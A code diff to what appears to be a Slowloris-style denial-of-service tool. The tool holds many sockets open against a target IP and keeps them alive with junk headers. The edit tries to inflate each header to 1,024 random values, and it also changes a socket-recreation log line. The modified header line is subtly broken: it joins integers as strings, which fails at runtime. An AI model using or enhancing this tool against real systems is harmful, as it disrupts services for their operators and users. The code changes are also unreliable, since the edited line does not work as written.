@@ -87,12 +87,12 @@ def main():
         log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
         for s in list(list_of_sockets):
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                s.send("X-a: {}\r\n".format("".join([random.randint(1, 5000) for _ in range(1024)])).encode("utf-8"))
             except socket.error:
                 list_of_sockets.remove(s)
 
         for _ in range(socket_count - len(list_of_sockets)):
-            log("Recreating socket...")
+            log("Recreating socket...", socket_count - len(list_of_sockets))
             try:
                 s = init_socket(ip)
                 if s:
